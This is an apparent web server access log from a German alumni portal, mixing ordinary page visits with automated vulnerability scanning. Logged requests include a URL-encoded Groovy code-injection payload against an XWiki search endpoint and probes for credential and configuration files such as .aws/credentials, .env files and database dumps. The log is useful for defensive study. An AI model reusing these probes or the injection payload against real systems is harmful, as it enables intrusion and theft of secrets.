user;timestamp;referer;target;method;status
92307207a449571858889a34fc63900c5306bf45adf2f3eaf7f1eb351c4c3900;2025-11-28 05:30:26;;/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28"Hello%20from"%20%2B%20"%20search%20text%3A"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:03;;/app_dev.php/_profiler/phpinfo;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:04;;/?phpinfo=-1;GET;200
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:07;;/info/phpinfo;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:09;;/debug/default;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:27;;/config.env;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:29;;/docker-compose.yml;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:30;;/configuration.yaml;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:31;;/api/phpinfo.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:33;;/admin/phpinfo;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:35;;/env.js;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:36;;/static/historypage.js;GET;404
89d822d9b960d5c58dbb8fc7c3ad6922825a0a3775adc2e506b2e08c4762edb1;2025-11-28 05:33:06;/;/;GET;200
be38b96435f9f356e1d63726c477013b15b6199023d4c44c9ecf597e03009b42;2025-11-28 05:34:04;;/;GET;200
4f9cea01b1d5af6737752849a3c01bbcdbfa0b0134ab4f1db35823819367a2c0;2025-11-28 05:37:19;;/gruppen/hobby/einzelsportarten;GET;302
b685dccece193a5885af57af9b8c086dbb21e2487fce445f34419bc44f2c595f;2025-11-28 05:37:40;;/;GET;200
3162bb24dd6ba996026a7aa8fd24241fb39d479add1d9ba664fb1ed8e2210ca2;2025-11-28 05:38:25;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
26f3e27d42de7cb0b3c11e72ea3e610d49b98448e1187ae5b48c4be73e26f722;2025-11-28 05:44:11;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-28 05:48:01;/gruppen/hobby/debattieren;/gruppen/hobby/musikproduktion;GET;302
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-28 05:48:02;/gruppen/hobby/debattieren;/gruppen;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-28 05:49:23;/gruppen/hobby/ernahrungswissenschaft;/gruppen/hobby/chor;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-28 05:49:24;/gruppen/hobby/ernahrungswissenschaft;/gruppen;GET;200
0de2f958718a9b9718882e6c0c9c9c450e0f0fe0505392332b13c46b35000648;2025-11-28 05:50:41;;/personen;GET;200
1d0c72a5edb3f12eda8de2cea607435713d03885c04641956660e66d6043bc62;2025-11-28 05:52:29;;/sitemap.xml;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-28 06:09:11;/personen/alumni/details/albert-hammig;/personen/alumni/schule/4240545;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-28 06:10:34;/gruppen/hobby/ernahrungswissenschaft;/gruppen/hobby/fotobearbeitung;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-28 06:10:35;/gruppen/hobby/ernahrungswissenschaft;/gruppen;GET;200
457a06ae2be07054db17ebfbd3ca48db694c56374f72ea8922d30be15881a8c7;2025-11-28 06:15:04;;/personen/all/3;GET;200
800664d81b1ea70652f65a0321881179675d0579f4a6cb564df7e2e5872cb933;2025-11-28 06:23:45;;/;GET;200
85290f67fe86644f7d11f908d0346793cc493806c709b572d2f18651654e3e0e;2025-11-28 06:23:52;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
2fb5811ecf21eb071097deedd7f5a237816d13eb4dac29913cac3a4961bfd392;2025-11-28 06:31:31;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-28 06:33:22;/personen/all/2;/personen/all/5;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-28 06:34:46;/gruppen/hobby/ernahrungswissenschaft;/gruppen/interesse/teamarbeit;GET;200
ce216599bbf5e83c19d99c96482786158ce0824cf41e328932d8682e30a42e8b;2025-11-28 06:43:36;;/.vscode/sftp.json;GET;404
46a256bad355735bd0a910a71608a4983b212bf73fbf8fc182ea56d4a7706463;2025-11-28 06:45:04;;/personen/all/4;GET;200
f20835b7bbd88f62651279df1c2dad8d4733f7f2d7ee866191a181b31e4d9680;2025-11-28 06:49:40;;/personen/alumni/schule/09A05;GET;200
e4b3a3dbd7be011d0bafc1cd96a5b0029a1f1269315ee385a36dffc0f30d4729;2025-11-28 06:50:22;;/sitemap_index.xml;GET;404
110a296d6273f2229d22716bb45e5a1f0574bb29dd1d2728b90a2ad8e1ed36c7;2025-11-28 06:50:53;/;/;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-28 06:53:39;/gruppen/interesse/selbststandigkeit;/personen/alumni/details/benjamin-wagner;GET;200
c1dbcfe1961f7de120b0eaf2fca6a23fbf720046cbb2f4a7b76b5674488c736a;2025-11-28 06:54:37;;/personen/alumni/details/tobi-esche;GET;200
c4dec20a6fd741b0c22fc3fa4f85585fc5e49033f8c84b464dbda0d2029dabba;2025-11-28 06:54:57;;/;GET;200
1ca3e770869dd2f4af2ed7c72bfc451928b4fb762d5782394e065d45bf8c947b;2025-11-28 06:56:20;;/;GET;200
14344eabfdaa0af09eadfea89fd357f5c34ebfaf9f1bd631f7a1484013fd6356;2025-11-28 06:56:27;;/config.json;GET;404
32845091c46979b9633d68afe6114ccdabe2f2cedec9c1e3a7e02b85a373ec55;2025-11-28 07:00:08;;/;GET;200
32845091c46979b9633d68afe6114ccdabe2f2cedec9c1e3a7e02b85a373ec55;2025-11-28 07:04:38;;/webui/;GET;404
c7c22f6e5025a412352c7fb1d6ddabe019caedaba17bb09b1ae0fc5bfdd093de;2025-11-28 07:04:46;;/themen?category=politik;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-28 07:09:16;/gruppen/hobby/ernahrungswissenschaft;/gruppen/interesse/datenanalyse-und-forschung;GET;200
d3243c51bc6adc50c0cba81628eeb129a61a353693fa7d04c66fc677dd98d8c7;2025-11-28 07:09:40;;/;GET;200
da2c52833197dfa23769515cce8e28bb0669d2cb85c8c765e2f9d5925e41c6e2;2025-11-28 07:19:25;;/;GET;200
32845091c46979b9633d68afe6114ccdabe2f2cedec9c1e3a7e02b85a373ec55;2025-11-28 07:21:16;;/geoserver/web/;GET;404
702a5732dbbfd6c9e387a03d7afd1b9acaf0fd9051aadfca66bbe58bfdf30dd2;2025-11-28 07:23:09;;/personen/alumni/details/dilek-keskin;GET;200
b90cfec148519af758ed68612310384cf1c32cd5c24a1738c5416cb9dc423437;2025-11-28 07:24:46;;/htmx/get;GET;405
438c1a568ecfb37776eebcd8d23a8e751c2fd3e4cba356e48568a689aa541cbb;2025-11-28 07:29:06;/;/;GET;200
4c842371c1215c87ebc986259aaffc56063d824273f9bcd7bce51263783c3498;2025-11-28 07:29:23;/sitemap.xml;/sitemap.xml;GET;200
9c48f3bffdae16fbde890197919079b2067cdfa44bf4d24f52c86c576171821f;2025-11-28 07:29:41;;/;GET;200
487ef9bff9640470cfab924ba8874fc07a6e0e7b7aeecb7aaffd89168cf993ae;2025-11-28 07:30:32;;/sitemap.xml;GET;200
4cb1b46f04d224ff027d3e3d3e191bbe1ec93f57c9be3eadfdc296103c951f85;2025-11-28 07:31:03;;/config.json;GET;404
d434b05b4bffcc5dbc96e85c0bbca469321c7ab87e29ec83280cd45bf6058760;2025-11-28 07:36:05;;/personen/alumni/details/joel-schlunder;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-28 07:39:03;/personen/alumni/details/josephine-muller;/gruppen/hobby/politik-und-debatten;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-28 07:39:04;/personen/alumni/details/josephine-muller;/gruppen;GET;200
43b543eb65d081b65e5d432a2113d15bb1d1b4e6a7706dcc2689caa8dd7204e5;2025-11-28 07:39:51;;/ReportServer;GET;404
68dc3c989e6b531ede9c293187f37689d0b20a7704c450e978d5b22427b2ca4f;2025-11-28 07:43:07;;/personen/alumni/details/cynthia-ott;GET;200
baefb152f26544e034ada709f53518e4d9f7b7ab9e32668878ab9f6aa2e1f7fa;2025-11-28 07:43:57;;/personen/all/5;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:36;;/?search=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:38;;/?query=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:42;;/?q=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:47;;/?s=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:51;;/?find=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:54;;/?lookfor=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:58;;/?keyword=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:02;;/?text=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:05;;/?term=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:08;;/?kwd=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:13;;/?product=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:16;;/?item=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:20;;/?catalog=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:23;;/?goods=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:28;;/?article=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:32;;/?entry=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:35;;/?title=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:39;;/?desc=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:43;;/?content=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:47;;/?story=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:51;;/?topic=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:54;;/?thread=dorktest303;GET;200
5984439a171c341605f861a70d93411e6e76c5ab554e500deda348b8387b38ed;2025-11-28 07:50:04;;/;GET;200
98de58f22dfed6f76585f1f7407a49ebd7dd422114f594f42bfddae40fd3cac5;2025-11-28 07:53:23;;/;GET;200
5984439a171c341605f861a70d93411e6e76c5ab554e500deda348b8387b38ed;2025-11-28 07:56:17;;/security.txt;GET;404
34be5d1c3386e133cbdf5010f50837ef98e40d1c16ede4503a0613ebc942e40f;2025-11-28 08:02:57;;/gruppen/hobby/wandern;GET;302
34be5d1c3386e133cbdf5010f50837ef98e40d1c16ede4503a0613ebc942e40f;2025-11-28 08:02:59;/gruppen/hobby/wandern;/gruppen;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-28 08:03:37;/;/;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-28 08:03:39;;/;GET;200
6f246e3a3f74087c6f8f7d45d6ee8246290820b03a78b3ff0cc3b2ecc4eeb130;2025-11-28 08:08:44;;/;GET;200
0af89a5367b7ebaa15c34a0cdedbb404bb9e4af42d1a1448d8e8d7d546c77b13;2025-11-28 08:13:28;;/;GET;200
92394453b02b4f8efb5e561f19ee6b51f2847a80761170f558e60d5a0685395b;2025-11-28 08:21:13;;/;GET;200
551a2bfe4085ed17892199ca0e1de6ed06737c7e1a19868ad6a3590227f51a0f;2025-11-28 08:30:29;;/;GET;200
9f6ccdf2128101487f86a81f63b476651fa1dd08f5b23c3efc94e9a415810d43;2025-11-28 08:31:15;/;/;GET;200
a091388303b495ef1b7fcd0f5373ddaf85ee47173c161d3d3dcdba86b9855298;2025-11-28 08:33:59;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
9ca84a0ecac52bfb4cdb853dc83b6b5b244ce2b2ea5b6666cee4cecc138dd231;2025-11-28 08:34:02;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-28 08:46:26;;/?XDEBUG_SESSION_START=phpstorm;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:36;;/imprint;GET;404
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:39;;/;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:41;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:41;;/themen/details/abschied-aus-moabit;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:41;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:42;;/personen;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:42;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
0afa02b8904ddd3cbc48314b53987a4dea0abf215edc67498edae07246efd627;2025-11-28 08:50:45;;/;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-28 08:51:42;;/favicon.192x192.png;GET;404
cb72eb0418ace7654c405e92adb4499de145cca21b9ee066584a01bf159be363;2025-11-28 08:52:08;;/;GET;200
074521a40973e9d5e00805e219101fbf3a4032d7100df7fae537c2781f551598;2025-11-28 08:52:09;;/themen/details/gemeinsam-stark-organisiert;GET;200
b7217d69e8d0115bb190e4e14c6e43253cdf077156dab449d4a7433c7996b23e;2025-11-28 08:52:59;;/admin/config.php;GET;404
18428a84116f8cd8abbd84d94f57800636a899f4952a1dfab4c803302653ab21;2025-11-28 08:53:07;;/personen;GET;200
afc48608d23bff368b4669dcf9faba3e2fe9dcbff3edfdf8328dee6050fe21a0;2025-11-28 08:54:27;;/;GET;200
c929ee95730ba6ef1ee48df48ee60b2a042192c5b52fb38566d40c91ed8cce13;2025-11-28 09:11:57;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
03040fc47888d54a386842adb7233482b366d303a945cc398eabdbd59f3b4fc0;2025-11-28 09:15:23;;/;GET;200
551a2bfe4085ed17892199ca0e1de6ed06737c7e1a19868ad6a3590227f51a0f;2025-11-28 09:18:52;;/;GET;200
4344cc696b0c5bde826db46baed1e511923fae9e97b16573f245084ae6a9fd07;2025-11-28 09:26:13;;/;GET;200
26e892606cd92d684af75b6252a9a3fed4476423e6900ba164a52b3d65f5221c;2025-11-28 09:31:55;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
a15d0299167e1cc2eb56c724516b950ab84bcb7f8a454e3353eb5707fcc4a8bc;2025-11-28 09:34:15;/;/;GET;200
e4c34f58cf62101e067f93fa39325c2a42fe4375e072be7f2e3fd2b9e63c3dfa;2025-11-28 09:35:54;;/components/com_sexycontactform/fileupload/index.php?file=tf2rghf.jpg;GET;404
6bf2faf0dd32fb6e3fcd8d18f10e8034591240600b1c99bd37477be1ecd95d0b;2025-11-28 09:40:43;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
316eefdf1ed4bdfc59e5e0ec5320cae11e138da8a44ef6b593d4f8193cfe3fd8;2025-11-28 09:49:27;;/;GET;200
da3b98fa1999aa860bccfbce0cc14539925687f3c6ffc4061a42c93d80c45431;2025-11-28 09:50:55;;/personen/alumni/schule/9009;GET;200
7767349253901554bea2940a0e7797e725a93d228ed9b35e23014ee0c70d25ea;2025-11-28 09:52:47;/admin;/admin;GET;302
7767349253901554bea2940a0e7797e725a93d228ed9b35e23014ee0c70d25ea;2025-11-28 09:52:47;/admin;/login;GET;200
a2621d39c3bc631c2257d86d91d8f43e072c7fb919691ea3babd7cdb308b4037;2025-11-28 09:54:03;;/themen/details/hackerangriff-lauft-ins-leere;GET;200
11b9c12ee2382a7db1bc816b512f200420de4f836530fddcb2104ad6be11ac7c;2025-11-28 09:57:55;/;/;GET;200
afc45b3c9ae544346539a204f5c3f58b451be58760448f2843f4fa2048c8e8ab;2025-11-28 09:59:33;;/;GET;200
904ee9d9a5d60438e018385113a9c1b46c0cdcabaffbb860e5424c934589c8fd;2025-11-28 10:01:21;;/;GET;200
043032b99a23b3a88656953cf3dab7687cfd02c4fa784ff45f351a37132bec1c;2025-11-28 10:08:20;/.aws/credentials;/.aws/credentials;GET;404
5bf83b1ec0776184b543dec0d1d5cd15331529c041296b03bedf10cd82199a8b;2025-11-28 10:08:35;/config.php;/config.php;GET;404
b2672066c8d0c855807aac910f1b642afe20792c6f04fcd449fa04bfbd644128;2025-11-28 10:08:36;/config.json;/config.json;GET;404
e753c09926441e5d8524eec1726cab934502c59997e3756593bc44dbd4907396;2025-11-28 10:08:54;/application.yml;/application.yml;GET;404
d4c0f9bc08022754717d32e0580bd9d6757bddbb564c917e5135459a3727628b;2025-11-28 10:09:11;/docker-compose.yaml;/docker-compose.yaml;GET;404
1171a83022c2ba36294de7d80314aec33b4215c3decd0adaa9fd42290837a8e8;2025-11-28 10:09:15;/actuator/env;/actuator/env;GET;404
463fb6432161813ff819183fc0ff6315239aea497edf8a921bc2483ee62f3812;2025-11-28 10:09:16;/actuator/configprops;/actuator/configprops;GET;404
6083f69c22aa2538bf681e5728330ff3c2a42d304e2dcbbfa74c989478ab19cc;2025-11-28 10:09:20;/env;/env;GET;404
f938a195beb781b942e7870260ea385fea0e3c28065eecab8a0a8671a35290b6;2025-11-28 10:09:41;/dump.sql;/dump.sql;GET;404
c993a1a9cacd2a3c1a11737ecb0211762bbe3254a33864fa0adcb52fd4db1dd6;2025-11-28 10:09:42;/database.sql;/database.sql;GET;404
8b981d1c93d549da64cee9785d36082e2125095dc6ea51e61f86b4145cbf4623;2025-11-28 10:15:57;;/personen;GET;200
ca579618a5d0aabb4f3e09e9f7d2ec946f47d94c51499028437cbfc85170e288;2025-11-28 10:17:57;;/;GET;200
8b89e5fa4515e50ad82e7ad75af6d5397ee7a9a0054652c29757598376f26df1;2025-11-28 10:18:35;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
e2ab3e1bba868d2672759e2515c85027b91f263efe0e0ad1c1505d95cbb72e64;2025-11-28 10:20:23;;/;GET;200
86e36026d534d7d55aa71326f1e6cf1d66374546e1be7de78e9751ff71985973;2025-11-28 10:35:17;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-28 10:42:47;;/actuator/gateway/routes;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:03;;/_profiler/phpinfo;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:03;;/php_info.php;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:03;;/test.php;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:05;;/phpinfo.php;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:05;;/info.php;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:05;;/phpinfo;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:06;;/;GET;200
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:07;;/js;GET;404
39394126870247a30c2942dd4ebb4eb97b2aac2b1c2c062d958eaec98c357fb7;2025-11-28 10:54:39;;/;GET;200
8cb3c8ed5b66ab64dc616b4bbe4736c016fd3f4dc29ef76c57bcc83210abaa80;2025-11-28 10:57:20;;/docs/software/php-ide.md;GET;404
4e5937c56de9e6d7fc7e598c76a22934757f45bf9bdfbf32a266f8cd9bbcf6da;2025-11-28 10:57:47;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
357657664c858e6e68d48462806fc876122d5223cd670790bf14a937d3994dce;2025-11-28 11:02:45;;/+CSCOL+/Java.jar;GET;404
357657664c858e6e68d48462806fc876122d5223cd670790bf14a937d3994dce;2025-11-28 11:02:46;;/+CSCOE+/logon_forms.js;GET;404
357657664c858e6e68d48462806fc876122d5223cd670790bf14a937d3994dce;2025-11-28 11:02:47;;/+CSCOL+/a1.jar;GET;404
357657664c858e6e68d48462806fc876122d5223cd670790bf14a937d3994dce;2025-11-28 11:02:48;;/+CSCOE+/transfer.js;GET;404
c34ccf853cdbcb94d063e8b0338ae4791108e6ba11591d1afa2318497acc0471;2025-11-28 11:02:54;;/personen/all/5;GET;200
e2ab3e1bba868d2672759e2515c85027b91f263efe0e0ad1c1505d95cbb72e64;2025-11-28 11:10:02;;/;GET;200
68d397a878f2c49af88decba26fda3cdf81ba0983e2949025838cea8a473a2b0;2025-11-28 11:12:51;;/;GET;200
68d397a878f2c49af88decba26fda3cdf81ba0983e2949025838cea8a473a2b0;2025-11-28 11:12:52;;/;GET;200
4d2285947bcae30809504cb77443a01f4da7ba7e41c46ad6c15c7432a9ec7bb7;2025-11-28 11:31:50;/sitecore/shell/sitecore.version.xml;/sitecore/shell/sitecore.version.xml;GET;404
4d7147f496550a5dbd884d6b4c9a4bad79195da02626891efb212d05cf6f6fd1;2025-11-28 11:33:33;;/;GET;200
3d778385e0821a0b89798cc244afbff10609842c2226838ad47ffb8806b6c8e1;2025-11-28 11:35:47;/media/system/js/core.js;/media/system/js/core.js;GET;404
3d778385e0821a0b89798cc244afbff10609842c2226838ad47ffb8806b6c8e1;2025-11-28 11:35:47;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
3d26494895aaa3ae4077e977c5fb6c5aaa3f3358278d96649fd7bdb53ebd0775;2025-11-28 11:41:14;;/;GET;200
18465003bf08a02c148c944121bcfffef736ca74d9737b3448024c28f0896ed6;2025-11-28 11:44:49;;/personen/alumni/schule/MP001;GET;200
a0ae96a1ad695cb5e517cac1c092778731ea51792e7e1ac1058a489f25c493a4;2025-11-28 12:00:05;;/imprint;GET;404
a0ae96a1ad695cb5e517cac1c092778731ea51792e7e1ac1058a489f25c493a4;2025-11-28 12:00:06;;/;GET;200
a0ae96a1ad695cb5e517cac1c092778731ea51792e7e1ac1058a489f25c493a4;2025-11-28 12:00:08;;/themen/details/abschied-aus-moabit;GET;200
a0ae96a1ad695cb5e517cac1c092778731ea51792e7e1ac1058a489f25c493a4;2025-11-28 12:00:08;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
a0ae96a1ad695cb5e517cac1c092778731ea51792e7e1ac1058a489f25c493a4;2025-11-28 12:00:08;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
a0ae96a1ad695cb5e517cac1c092778731ea51792e7e1ac1058a489f25c493a4;2025-11-28 12:00:09;;/personen;GET;200
